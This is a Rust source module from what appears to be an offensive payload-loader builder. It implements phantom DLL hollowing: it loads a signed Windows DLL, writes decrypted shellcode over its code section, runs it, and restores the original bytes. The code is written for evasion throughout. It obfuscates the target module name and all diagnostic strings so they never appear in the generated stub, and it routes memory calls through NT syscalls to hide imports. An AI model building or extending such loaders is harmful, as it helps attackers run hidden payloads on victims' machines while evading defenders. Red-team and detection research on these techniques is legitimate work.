//! Phantom DLL hollowing.
//!
//! Loads a legitimate, signed DLL, overwrites the first bytes of its code
//! section with the decrypted payload and runs it from there — then restores
//! the original bytes so the module keeps proxying its exports. Distinct from
//! `module_stomping`, which stomps and runs without saving or restoring the
//! overwritten region. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for phantom DLL hollowing: which payload to run (the payload
/// format and export live in the payload's `build.payloads` entry) and which
/// signed module to hollow.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload in `build.payloads` to run. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,

    /// Module to load and hollow, as a name the loader can resolve
    /// (`wininet.dll`) or a full path. Defaults to [`default_module`].
    ///
    /// The module must be a real, loadable DLL the image can legitimately map:
    /// the technique saves and restores its original bytes so its exports keep
    /// working, which is only meaningful for a module other code may call. A
    /// module another step patched or hooked must not be chosen (the restore
    /// would undo that step's patch).
    #[serde(default = "default_module")]
    pub module: String,
}

/// Default module to hollow: present and Microsoft-signed on every Windows SKU,
/// with a code section large enough for a staged payload, and not loaded by a
/// stub that does not use it itself — so the load is this technique's doing.
pub fn default_module() -> String {
    "wininet.dll".to_string()
}

impl Default for Params {
    /// Defaults to hollowing `wininet.dll` (see [`default_module`]).
    fn default() -> Self {
        Self {
            payload: None,
            module: default_module(),
        }
    }
}

/// Static metadata for phantom DLL hollowing.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "dll_hollowing",
    // T1574.002 (DLL Side-Loading): ATT&CK's "Hijack Execution Flow" family,
    // where execution is redirected through a legitimate binary's module.
    attck: &["T1574.002"],
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/dll_hollowing/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    params_example: "technique: dll_hollowing\nparams:\n  module: wininet.dll\n",
    readme: include_str!("README.md"),
    // `NtAllocateVirtualMemory` holds the saved original `.text` bytes (out of
    // the default heap, where private memory is grouped by module), and
    // `NtProtectVirtualMemory` makes the section writable/executable across the
    // stomp and the restore. `LoadLibraryA` stays a Win32 import (a loader entry
    // point, not a kernel call the stub issues), so `mode: indirect` removes the
    // `VirtualAlloc`/`VirtualProtect` imports but keeps `LoadLibraryA`.
    syscalls: &["NtAllocateVirtualMemory", "NtProtectVirtualMemory"],
    // The payload is raw shellcode: it has no import table of its own, so the
    // shared resolver is not rendered.
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment_for` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — least of all the hollowing target
/// or a technique keyword — lands in the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    (
        "$MSG_EMPTY_PAYLOAD$",
        "dll_hollowing: the payload is empty",
    ),
    (
        "$MSG_PE_PAYLOAD$",
        "dll_hollowing: the payload is a PE image, but this technique only runs raw shellcode",
    ),
    (
        "$MSG_LOAD_FAILED$",
        "dll_hollowing: could not load the hollowing target",
    ),
    (
        "$MSG_HEADERS$",
        "dll_hollowing: the hollowing target's PE headers are malformed",
    ),
    (
        "$MSG_NO_CODE_SECTION$",
        "dll_hollowing: the hollowing target has no .text section",
    ),
    (
        "$MSG_TOO_LARGE$",
        "dll_hollowing: the payload does not fit the hollowing target's .text section",
    ),
    (
        "$MSG_ALLOC_FAILED$",
        "dll_hollowing: could not allocate a buffer for the original .text bytes",
    ),
    (
        "$MSG_PROTECT_FAILED$",
        "dll_hollowing: could not make the .text section writable",
    ),
    (
        "$MSG_RESTORE_FAILED$",
        "dll_hollowing: could not restore the .text section's protection",
    ),
];

impl Params {
    /// Renders the phantom-DLL-hollowing stub fragment for these parameters.
    ///
    /// The hollowing target and every diagnostic are rebuilt at runtime with the
    /// active string strategy, so neither the module name nor the message text
    /// appears in the generated stub's strings.
    ///
    /// `format` and `export` come from `build.payloads.<name>` for the
    /// Execution-technique contract; this technique only runs raw shellcode, so
    /// neither changes the fragment. `plan::validate` should reject the other
    /// formats for `dll_hollowing` before this runs — until it does, the
    /// fragment rejects a PE payload at runtime instead of executing its DOS
    /// header.
    pub fn render_fragment_for(
        &self,
        strings: &StringsConfig,
        _format: PayloadFormat,
        _export: Option<&str>,
    ) -> String {
        let module_def = strings
            .obfuscate(&self.module)
            .render_stub_expr("hollow_module");

        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }
        rendered.replace("$MODULE_DEF$", &module_def)
    }
}

#[cfg(test)]
mod tests;
